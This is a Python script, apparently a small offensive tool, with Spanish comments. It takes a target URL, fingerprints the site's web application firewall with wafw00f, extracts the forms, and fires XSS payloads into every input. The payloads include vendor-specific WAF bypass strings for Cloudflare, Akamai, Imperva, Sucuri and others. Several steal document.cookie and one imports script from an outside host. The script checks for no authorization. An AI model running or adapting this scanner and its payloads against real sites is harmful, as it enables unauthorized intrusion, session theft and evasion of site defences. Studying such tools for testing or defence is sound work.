from requests_html import HTMLSession
import requests
import urllib.parse
from bs4 import BeautifulSoup
import os
import re
import signal
from colorama import Fore, Style, init
import subprocess

# Inicializar colorama
init(autoreset=True)

def manejar_salida(sig, frame):
    print(f"\n{Fore.RED}[!] Interrupción detectada. Saliendo...{Style.RESET_ALL}")
    exit(0)

# Capturar Control + C
signal.signal(signal.SIGINT, manejar_salida)

def imprimir_banner():
    """Imprime un banner de bienvenida con colores."""
    banner = rf"""
{Fore.CYAN}▄▄▌ ▐ ▄▌ ▄▄▄· ▐▄• ▄ .▄▄ · .▄▄ · 
{Fore.BLUE}██· █▌▐█▐█ ▀█  █▌█▌▪▐█ ▀. ▐█ ▀. 
{Fore.MAGENTA}██▪▐█▐▐▌▄█▀▀█  ·██· ▄▀▀▀█▄▄▀▀▀█▄
{Fore.RED}▐█▌██▐█▌▐█ ▪▐▌▪▐█·█▌▐█▄▪▐█▐█▄▪▐█
{Fore.YELLOW} ▀▀▀▀ ▀▪ ▀  ▀ •▀▀ ▀▀ ▀▀▀▀  ▀▀▀▀{Style.RESET_ALL}                                                                                             
{Fore.GREEN}                                     by TheOffSecGirl{Style.RESET_ALL}
    """
    print(banner)

def detectar_waf(url):
    """Detecta la presencia de un WAF usando wafw00f."""
    try:
        resultado = subprocess.run(["wafw00f", url], capture_output=True, text=True)
        salida = resultado.stdout
        if "is behind" in salida:
            waf_detectado = salida.split("is behind")[-1].strip()
            print(f"{Fore.YELLOW}[!] Posible WAF detectado: {waf_detectado}{Style.RESET_ALL}")
            return waf_detectado
    except FileNotFoundError:
        print(f"{Fore.RED}[!] wafw00f no está instalado. Usa 'pip install wafw00f' o 'apt install wafw00f'.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Error al ejecutar wafw00f: {str(e)}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+] No se detectó WAF{Style.RESET_ALL}")
    return None

def extraer_formularios(url):
    """Extrae formularios, incluso los generados por JS e iframes."""
    session = HTMLSession()
    try:
        response = session.get(url)
        response.html.render(timeout=20)  # Renderizar JS
        soup = BeautifulSoup(response.html.html, "html.parser")
        forms = soup.find_all("form")
        datos_formularios = []
        for form in forms:
            action = form.get("action")
            full_action = urllib.parse.urljoin(url, action) if action else url
            method = form.get("method", "get").lower()
            inputs = {i.get("name", "unnamed"): i.get("type", "text") for i in form.find_all("input")}
            datos_formularios.append({"url": full_action, "method": method, "inputs": inputs})
        return datos_formularios
    except requests.RequestException as e:
        print(f"{Fore.RED}[!] Error al extraer formularios: {str(e)}{Style.RESET_ALL}")
        return []

def probar_xss(formularios, waf_detectado):
    """Prueba payloads XSS en los formularios detectados dependiendo del WAF."""
    # Payloads básicos de XSS
    payloads = [
        "<script>alert(1)</script>", 
        "'><script>alert(1)</script>", 
        "<img src=x onerror=alert(1)>"
    ]

    # Payloads específicos para evadir WAFs
    waf_payloads = {
        "Akamai": [
            "';k='e'%0Atop //",
            "'><A HRef=' AutoFocus OnFocus=top//?. >"
        ],
        "CloudFlare": [
            "<svg/onload=window['al'+'ert']1337>",
            "<Svg Only=1 OnLoad=confirm(document.cookie)>",
            "<svg onload=alert&#0000000040document.cookie)>",
            "%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E",
            "<sVG/oNLY%3d1//On+ONloaD%3dco\u006efirm%26%23x28%3b%26%23x29;>",
            "<Img Src=//X55.is OnLoad%0C=import(Src)>",
            "<Img Src=OnXSS OnError=prompt(1337)>",
            "<Img Src=OnXSS OnError=prompt(document.cookie)>",
            "<Svg Only=1 OnLoad=confirm(atob('Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=='))>"
        ],
        "Cloudfront": [
            "'>'><details/open/ontoggle=confirm('XSS')>",
            "6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/",
            "';%window/aabb/['al'%2b'ert'](document./aabb/location);//",
            "'>%0D%0A%0D%0A<x '='foo'><x foo='><img src=x onerror=javascript:alert(cloudfrontbypass)//>'"
        ],
        "ModSecurity": [
            "<svg onload='new Function['Y000!'].find(al\u0065rt)'>"
        ],
        "Imperva": [
            "<Img Src=//X55.is OnLoad%0C=import(Src)>",
            "<sVg OnPointerEnter='location=javas+cript:ale+rt%2+81%2+9;//</div'>",
            "<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;lert&#x000000028;origin&#x000029;>",
            "<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle='propmt(document.cookie);'>"
        ],
        "Sucuri": [
            "<A HREF='https://www.cia.gov/'>Click Here </A>",
            "'><img src=x onerror=alert(document.cookie)>",
            "<button onClick='prompt(1337)'>Submit</button>",
            "<a aa aaa aaaa aaaaaa href=j&#97v&#97script&#x3A;&#97lert(1337)>ClickMe",
            "<a aa aaa aaaa aaaaaa href=j&#97v&#97script&#x3A;&#97lert(document.cookie)>ClickMe",
            "<a href='j&#97;vascript&#x3A;&#97;lert('Sucuri WAF Bypassed ! ' + document.domain + '\nCookie: ' + document.cookie); window&#46;location&#46;href='https://github.com/coffinxp';'>ClickMe</a>"
        ]
    }

    # Escoge los payloads según el WAF detectado
    if waf_detectado in waf_payloads:
        payloads = waf_payloads[waf_detectado]
        print(f"{Fore.RED}[!] Usando payloads específicos para {waf_detectado}{Style.RESET_ALL}")

    # Probar los payloads en los formularios
    for form in formularios:
        url = form["url"]
        for input_name in form["inputs"]:
            for payload in payloads:
                datos = {input_name: payload}
                try:
                    print(f"{Fore.YELLOW}[~] Probando payload: {payload} en {url} con input: {input_name}{Style.RESET_ALL}")
                    if form["method"] == "post":
                        response = requests.post(url, data=datos, timeout=10)
                    else:
                        response = requests.get(url, params=datos, timeout=10)
                    
                    print(f"{Fore.GREEN}[~] Respuesta de {url}: {response.status_code}{Style.RESET_ALL}")
                    if payload in response.text:
                        print(f"{Fore.RED}[!] XSS detectado en {url} con payload {payload}{Style.RESET_ALL}")
                        break
                except requests.RequestException as e:
                    print(f"{Fore.RED}[!] Error en la solicitud a {url}: {str(e)}{Style.RESET_ALL}")

def main(url):
    imprimir_banner()
    waf_detectado = detectar_waf(url)
    formularios = extraer_formularios(url)
    if formularios:
        print(f"{Fore.GREEN}[+] Se encontraron {len(formularios)} formularios. Probando XSS...{Style.RESET_ALL}")
        probar_xss(formularios, waf_detectado)
    else:
        print(f"{Fore.YELLOW}[!] No se encontraron formularios.{Style.RESET_ALL}")

if __name__ == "__main__":
    objetivo = input("Ingrese la URL objetivo: ")
    main(objetivo)
